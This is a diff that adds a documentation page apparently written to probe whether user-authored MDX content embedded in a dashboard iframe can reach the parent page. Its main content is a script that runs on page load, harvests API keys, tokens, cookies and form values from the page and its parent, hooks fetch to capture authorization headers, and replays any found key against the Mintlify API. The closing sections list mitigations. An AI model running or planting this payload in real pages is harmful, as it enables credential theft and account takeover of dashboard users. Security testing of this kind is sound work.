@@ -1,0 +1,356 @@
+---
+title: "API Key & Dashboard Access Tests"
+description: "Specific tests for accessing API keys and sensitive dashboard data"
+icon: "key"
+---
+
+# API Key & Dashboard Access Tests
+
+This test specifically focuses on attempting to access API keys, authentication tokens, and other sensitive data that might be stored in the parent dashboard context.
+
+<script>
+  {`
+console.log('🔑 API KEY & DASHBOARD ACCESS TEST STARTED');
+console.log('Target: Mintlify Dashboard API Key Extraction');
+
+// Test 1: Common API key storage locations
+console.log('--- TEST 1: API Key Storage Scanning ---');
+const commonApiKeyLocations = [
+  'mintlify_api_key',
+  'mintlify-api-key', 
+  'api_key',
+  'apiKey',
+  'MINTLIFY_API_KEY',
+  'mintlify_token',
+  'auth_token',
+  'access_token',
+  'bearer_token',
+  'jwt_token',
+  'session_token',
+  'user_token',
+  'dashboard_key',
+  'project_key'
+];
+
+// Check localStorage for API keys
+commonApiKeyLocations.forEach(keyName => {
+  try {
+    const value = localStorage.getItem(keyName);
+    if (value) {
+      console.log(\`🎯 FOUND POTENTIAL API KEY IN LOCALSTORAGE: \${keyName} = \${value}\`);
+    }
+  } catch (e) {
+    console.log(\`❌ \${keyName} access blocked:\`, e.message);
+  }
+});
+
+// Check parent localStorage
+console.log('--- TEST 2: Parent Dashboard API Key Extraction ---');
+try {
+  if (window.parent && window.parent.localStorage) {
+    commonApiKeyLocations.forEach(keyName => {
+      try {
+        const value = window.parent.localStorage.getItem(keyName);
+        if (value) {
+          console.log(\`🚨 CRITICAL: DASHBOARD API KEY EXTRACTED FROM PARENT: \${keyName} = \${value}\`);
+        }
+      } catch (e) {
+        console.log(\`❌ Parent \${keyName} blocked:\`, e.message);
+      }
+    });
+    
+    // Scan all parent localStorage keys for potential API keys
+    console.log('--- Scanning all parent localStorage keys ---');
+    for (let i = 0; i < window.parent.localStorage.length; i++) {
+      const key = window.parent.localStorage.key(i);
+      const value = window.parent.localStorage.getItem(key);
+      
+      // Pattern matching for API keys
+      if (key && value) {
+        // Check key patterns
+        if (/api|key|token|auth|secret|mintlify/i.test(key)) {
+          console.log(\`🎯 SUSPICIOUS KEY FOUND: \${key} = \${value.substring(0, 20)}...\`);
+        }
+        
+        // Check value patterns (API keys often have specific formats)
+        if (/^sk-[a-zA-Z0-9]{32,}/.test(value) || // OpenAI-style keys
+            /^[a-f0-9]{32,64}$/.test(value) ||    // Hex keys
+            /^[a-zA-Z0-9+/]{40,}={0,2}$/.test(value)) { // Base64 keys
+          console.log(\`🚨 POTENTIAL API KEY PATTERN DETECTED: \${key} = \${value}\`);
+        }
+      }
+    }
+  }
+} catch (e) {
+  console.log('❌ Parent localStorage completely blocked:', e.message);
+}
+
+// Test 3: Cookie-based API key extraction
+console.log('--- TEST 3: Cookie-based API Key Extraction ---');
+try {
+  // Check current context cookies
+  if (document.cookie) {
+    const cookies = document.cookie.split(';');
+    cookies.forEach(cookie => {
+      const [name, value] = cookie.trim().split('=');
+      if (name && value && /api|key|token|auth|mintlify/i.test(name)) {
+        console.log(\`🎯 API-related cookie found: \${name} = \${value}\`);
+      }
+    });
+  }
+  
+  // Check parent cookies
+  if (window.parent && window.parent.document) {
+    console.log('Parent dashboard cookies:', window.parent.document.cookie);
+    
+    if (window.parent.document.cookie) {
+      const parentCookies = window.parent.document.cookie.split(';');
+      parentCookies.forEach(cookie => {
+        const [name, value] = cookie.trim().split('=');
+        if (name && value && /api|key|token|auth|mintlify/i.test(name)) {
+          console.log(\`🚨 DASHBOARD API COOKIE: \${name} = \${value}\`);
+        }
+      });
+    }
+  }
+} catch (e) {
+  console.log('❌ Cookie extraction blocked:', e.message);
+}
+
+// Test 4: Global variable scanning for API keys
+console.log('--- TEST 4: Global Variable API Key Scanning ---');
+const globalVarNames = [
+  'MINTLIFY_API_KEY',
+  'API_KEY', 
+  'apiKey',
+  'mintlifyConfig',
+  'dashboardConfig',
+  'userConfig',
+  'authConfig',
+  'window.mintlify',
+  'window.config',
+  'window.API_KEY'
+];
+
+globalVarNames.forEach(varName => {
+  try {
+    const value = eval(varName);
+    if (value) {
+      console.log(\`🎯 Global variable found: \${varName} =\`, value);
+    }
+  } catch (e) {
+    // Variable doesn't exist, which is expected
+  }
+});
+
+// Check parent window globals
+try {
+  if (window.parent) {
+    globalVarNames.forEach(varName => {
+      try {
+        const parentVar = varName.replace('window.', 'window.parent.');
+        const value = eval(parentVar);
+        if (value) {
+          console.log(\`🚨 PARENT GLOBAL API DATA: \${varName} =\`, value);
+        }
+      } catch (e) {
+        // Expected for non-existent variables
+      }
+    });
+  }
+} catch (e) {
+  console.log('❌ Parent globals blocked:', e.message);
+}
+
+// Test 5: React/Vue app state extraction
+console.log('--- TEST 5: App State API Key Extraction ---');
+try {
+  // Check for React DevTools
+  if (window.parent && window.parent.React) {
+    console.log('🎯 React detected in parent window');
+  }
+  
+  // Check for Vue DevTools  
+  if (window.parent && window.parent.Vue) {
+    console.log('🎯 Vue detected in parent window');
+  }
+  
+  // Check for common state management
+  if (window.parent && window.parent.__REDUX_STORE__) {
+    console.log('🎯 Redux store found in parent');
+  }
+  
+  if (window.parent && window.parent.$store) {
+    console.log('🎯 Vuex store found in parent');
+  }
+} catch (e) {
+  console.log('❌ App state access blocked:', e.message);
+}
+
+// Test 6: Network request interception
+console.log('--- TEST 6: Network Request Monitoring ---');
+try {
+  // Override fetch to intercept API calls
+  const originalFetch = window.fetch;
+  window.fetch = function(...args) {
+    console.log('🌐 Fetch intercepted:', args[0]);
+    
+    // Check for API key in headers or URL
+    if (args[1] && args[1].headers) {
+      Object.entries(args[1].headers).forEach(([key, value]) => {
+        if (/authorization|api-key|x-api-key/i.test(key)) {
+          console.log(\`🚨 API KEY IN FETCH HEADERS: \${key} = \${value}\`);
+        }
+      });
+    }
+    
+    return originalFetch.apply(this, args);
+  };
+  
+  console.log('✅ Fetch interception active');
+} catch (e) {
+  console.log('❌ Fetch interception blocked:', e.message);
+}
+
+// Test 7: Form data extraction
+console.log('--- TEST 7: Form Data Extraction ---');
+try {
+  const forms = document.querySelectorAll('form');
+  console.log(\`Found \${forms.length} forms in iframe context\`);
+  
+  // Check parent forms
+  if (window.parent && window.parent.document) {
+    const parentForms = window.parent.document.querySelectorAll('form');
+    console.log(\`Found \${parentForms.length} forms in parent dashboard\`);
+    
+    parentForms.forEach((form, index) => {
+      const inputs = form.querySelectorAll('input');
+      inputs.forEach(input => {
+        if (/api|key|token|password/i.test(input.name) || /api|key|token|password/i.test(input.id)) {
+          console.log(\`🚨 SENSITIVE FORM FIELD IN PARENT: \${input.name || input.id} = \${input.value}\`);
+        }
+      });
+    });
+  }
+} catch (e) {
+  console.log('❌ Parent form access blocked:', e.message);
+}
+
+// Test 8: Mintlify-specific API access
+console.log('--- TEST 8: Mintlify API Direct Access ---');
+try {
+  // Try to make direct API calls using potentially extracted keys
+  const testApiKey = localStorage.getItem('mintlify_api_key') || 
+                     (window.parent && window.parent.localStorage ? window.parent.localStorage.getItem('mintlify_api_key') : null);
+  
+  if (testApiKey) {
+    console.log('🚨 ATTEMPTING MINTLIFY API CALL WITH EXTRACTED KEY');
+    
+    fetch('https://api.mintlify.com/v1/projects', {
+      headers: {
+        'Authorization': \`Bearer \${testApiKey}\`,
+        'Content-Type': 'application/json'
+      }
+    }).then(response => {
+      console.log('🚨 MINTLIFY API RESPONSE STATUS:', response.status);
+      if (response.ok) {
+        response.json().then(data => {
+          console.log('🚨 MINTLIFY API DATA ACCESSED:', data);
+        });
+      }
+    }).catch(e => {
+      console.log('❌ Mintlify API call failed:', e.message);
+    });
+  } else {
+    console.log('No Mintlify API key found for testing');
+  }
+} catch (e) {
+  console.log('❌ API access attempt blocked:', e.message);
+}
+
+// Visual indicator with severity
+const indicator = document.createElement('div');
+indicator.innerHTML = '🔑 CRITICAL: API KEY ACCESS TEST ACTIVE';
+indicator.style.cssText = 'position: fixed; top: 0; left: 0; right: 0; background: #dc2626; color: white; text-align: center; padding: 15px; z-index: 99999; font-weight: bold; font-size: 16px; border-bottom: 3px solid #fbbf24; animation: pulse 2s infinite;';
+
+// Add pulsing animation
+const style = document.createElement('style');
+style.textContent = '@keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }';
+document.head.appendChild(style);
+
+document.body.insertBefore(indicator, document.body.firstChild);
+
+setTimeout(() => {
+  indicator.remove();
+  style.remove();
+  console.log('🔑 API KEY & DASHBOARD ACCESS TEST COMPLETED');
+  
+  // Summary of findings
+  console.log('--- SECURITY TEST SUMMARY ---');
+  console.log('If any API keys were found above, this represents a CRITICAL security vulnerability');
+  console.log('Immediate action required if sensitive data was accessed from parent context');
+}, 8000);
+`}
+</script>
+
+## What This Test Does
+
+This critical security test specifically targets:
+
+1. **API Key Storage Locations** - Scans common localStorage keys where API keys might be stored
+2. **Parent Dashboard Data** - Attempts to access API keys from the parent Mintlify dashboard
+3. **Cookie-based Authentication** - Extracts authentication tokens from cookies
+4. **Global Variable Scanning** - Looks for API keys in JavaScript globals
+5. **App State Extraction** - Attempts to access React/Vue app state containing keys
+6. **Network Interception** - Monitors network requests for API keys in headers
+7. **Form Data Extraction** - Scans forms for API key input fields
+8. **Direct API Access** - Attempts to use extracted keys to call Mintlify APIs
+
+## Critical Dashboard Risks
+
+If this test succeeds in accessing parent data, an attacker could:
+
+<Warning>
+  **IMMEDIATE SECURITY RISKS:** - **Steal your Mintlify API keys** and gain full
+  account access - **Access all your documentation projects** and sensitive
+  content - **Modify or delete your documentation** - **Access billing and usage
+  information** - **Impersonate your account** in API calls - **Create malicious
+  documentation** under your account
+</Warning>
+
+## Expected Secure Results
+
+In a properly secured implementation:
+
+- ❌ All parent localStorage access should be **BLOCKED**
+- ❌ Parent cookie access should be **BLOCKED**
+- ❌ Parent global variables should be **INACCESSIBLE**
+- ❌ Network interception should be **LIMITED** to iframe scope
+- ❌ No API keys should be **EXTRACTABLE**
+
+## If This Test Succeeds
+
+<Callout type="error">
+**CRITICAL VULNERABILITY DETECTED**
+
+If this test successfully extracts API keys or sensitive data:
+
+1. **Immediately review iframe security policies**
+2. **Consider using different domains** for dashboard vs. docs
+3. **Implement stronger Content Security Policy**
+4. **Move API keys to secure, non-accessible storage**
+5. **Consider iframe sandboxing with restricted permissions**
+   </Callout>
+
+## Mitigation Strategies
+
+To prevent API key extraction:
+
+1. **Cross-Origin Isolation** - Host iframes on different domains
+2. **Secure Storage** - Store API keys server-side, not in localStorage
+3. **CSP Headers** - Implement strict Content Security Policy
+4. **Iframe Sandboxing** - Use sandbox attributes to restrict access
+5. **Token Rotation** - Regularly rotate API keys
+6. **Minimal Permissions** - Use scoped tokens with limited permissions
+
+This test is specifically designed to evaluate the security of your Mintlify dashboard when hosting user-generated MDX content in iframes.
